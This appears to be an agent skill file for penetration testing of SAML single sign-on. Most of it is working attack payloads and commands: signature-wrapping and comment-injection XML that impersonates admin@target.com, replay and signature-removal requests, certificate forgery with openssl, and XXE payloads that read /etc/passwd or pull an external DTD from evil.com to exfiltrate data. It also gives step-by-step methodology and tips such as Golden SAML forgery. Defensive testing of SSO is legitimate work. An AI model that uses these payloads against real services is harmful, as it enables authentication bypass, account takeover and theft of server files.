---
name: saml-attacks
description: SAML authentication attacks including XML signature wrapping, assertion manipulation, comment injection, and certificate abuse
---

# SAML Attacks

SAML (Security Assertion Markup Language) is used for SSO in enterprise environments. Flaws in XML signature verification, assertion parsing, and certificate validation enable authentication bypass, privilege escalation, and cross-tenant access.

## Attack Surface

- SSO login endpoints (`/saml/login`, `/saml/sso`, `/sso/saml`)
- Assertion Consumer Services (ACS endpoints)
- Service Provider (SP) and Identity Provider (IdP) metadata endpoints
- SAML responses (assertions, signatures, conditions)

## Reconnaissance

```bash
# Find SAML endpoints
curl -sk "https://TARGET/saml/metadata" | head -50
curl -sk "https://TARGET/auth/saml/metadata.xml" | head -50
curl -sk "https://TARGET/.well-known/saml-metadata" | head -50

# Check for SAML in login flow
curl -sk "https://TARGET/login" -D - -o /dev/null | grep -i "saml\|sso\|idp"

# Extract IdP metadata URL from SP metadata
curl -sk "https://TARGET/saml/metadata" | grep -oP 'entityID="[^"]*"'
```

## Key Vulnerabilities

### XML Signature Wrapping (XSW)

```xml
<!-- XSW1: Wrap original signed assertion, add malicious unsigned assertion -->
<saml:Response>
  <saml:Assertion ID="evil">  <!-- UNSIGNED — attacker controlled -->
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <Signature>
    <Reference URI="#original"/>  <!-- Signature validates the ORIGINAL assertion -->
  </Signature>
  <saml:Assertion ID="original">  <!-- SIGNED — but SP may process the first assertion -->
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</saml:Response>

<!-- XSW2: Move signed assertion into Signature's Object element -->
<!-- XSW3: Insert evil assertion before Signature -->
<!-- XSW4: Wrap signed assertion in Extensions element -->
<!-- XSW5-8: Various nesting strategies -->
```

### Comment Injection in NameID

```xml
<!-- Some XML parsers treat comments differently -->
<!-- NameID "admin@target.com" becomes "admin@target.com" after comment removal -->
<saml:NameID>admin@target.com<!---->.evil.com</saml:NameID>

<!-- The SP may see "admin@target.com.evil.com" for signing
     but process "admin@target.com" after comment removal -->

<!-- Or: -->
<saml:NameID>admin<!-- comment -->@target.com</saml:NameID>
```

### Assertion Replay

```bash
# Capture a valid SAML response and replay it
# If no replay protection (InResponseTo, one-time use):

# Step 1: Capture valid assertion from legitimate login
# Step 2: Replay the entire SAMLResponse to ACS endpoint

curl -sk "https://TARGET/saml/acs" -X POST \
  -d "SAMLResponse=BASE64_ENCODED_ASSERTION&RelayState=/"
```

### Signature Exclusion

```xml
<!-- Remove Signature element entirely — if SP doesn't require signatures -->
<saml:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
    <!-- No Signature element -->
  </saml:Assertion>
</saml:Response>
```

### Certificate Confusion

```bash
# If SP accepts self-signed certificates or doesn't pin IdP certificate:
# Generate attacker key pair
openssl req -new -x509 -days 365 -nodes -sha256 \
  -keyout attacker.key -out attacker.crt -subj "/CN=Attacker IdP"

# Sign malicious SAML assertion with attacker certificate
# Use saml-tool or custom script to craft signed assertion

# If SP accepts any valid signature (doesn't verify signer identity) → full bypass
```

### XXE in SAML

```xml
<!-- SAML messages are XML — test for XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</saml:Response>

<!-- External DTD for data exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "https://evil.com/xxe.dtd">
  %dtd;
]>
```

### XSLT Injection in SAML

```xml
<!-- If SAML processor applies XSLT transformations -->
<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <xsl:value-of select="system-property('os.name')"/>
    </xsl:template>
  </xsl:stylesheet>
</ds:Transform>
```

## Advanced Techniques

### Attribute Manipulation

```xml
<!-- Modify role/group attributes in assertion -->
<saml:AttributeStatement>
  <saml:Attribute Name="role">
    <saml:AttributeValue>admin</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="groups">
    <saml:AttributeValue>Domain Admins</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

### Conditions Bypass

```xml
<!-- Modify or remove time conditions -->
<saml:Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2030-12-31T23:59:59Z">
  <saml:AudienceRestriction>
    <saml:Audience>https://TARGET</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>

<!-- Remove conditions entirely if SP doesn't enforce -->
```

## Testing Methodology

1. **Capture SAML flow** — intercept SAMLRequest and SAMLResponse via browser proxy
2. **Decode assertion** — Base64 decode, analyze XML structure, identify signed elements
3. **Test signature removal** — remove entire Signature element, check if SP accepts unsigned assertion
4. **Test XSW variants** — try all 8 XSW attack patterns
5. **Test comment injection** — inject XML comments in NameID to alter identity
6. **Test assertion replay** — replay captured assertion at a later time
7. **Test XXE** — inject entity references in SAML XML
8. **Test certificate substitution** — sign with self-signed cert, check if SP validates signer

## Validation

1. Login as a different user via manipulated NameID (without valid IdP signature)
2. Signature wrapping allows unsigned assertion to be processed
3. Removed signature still accepted by SP
4. XXE payload extracts server files via SAML response processing
5. Replayed assertion grants access after original session expires

## False Positives

- SP strictly validates signature over entire assertion (XSW prevented)
- SP pins IdP certificate (self-signed certs rejected)
- Replay protection via InResponseTo and one-time-use tokens
- XML parser doesn't process external entities (XXE mitigated)

## Impact

- **Critical**: Authentication bypass → login as any user including admin
- **Critical**: Cross-tenant access in multi-tenant SAML SSO
- **High**: Privilege escalation via attribute manipulation
- **High**: XXE → file read, SSRF, or RCE via SAML XML processing

## Pro Tips

1. Use SAMLRaider (Burp extension) or saml-tool for convenient XSW and signature manipulation
2. Always test ALL 8 XSW variants — different XML libraries are vulnerable to different patterns
3. Comment injection is subtle and often bypasses signature validation (signature covers the comment text)
4. Many SPs only validate that a valid signature EXISTS — not that it covers the right assertion
5. SAML responses are Base64 encoded — decode with `echo 'RESPONSE' | base64 -d | xmllint --format -`
6. If SP metadata endpoint is exposed, it reveals ACS URL, certificate, and entity ID
7. Test IdP-initiated vs SP-initiated flows separately — they have different attack surfaces
8. Golden SAML attack: if you have the IdP signing certificate, you can forge assertions for any user
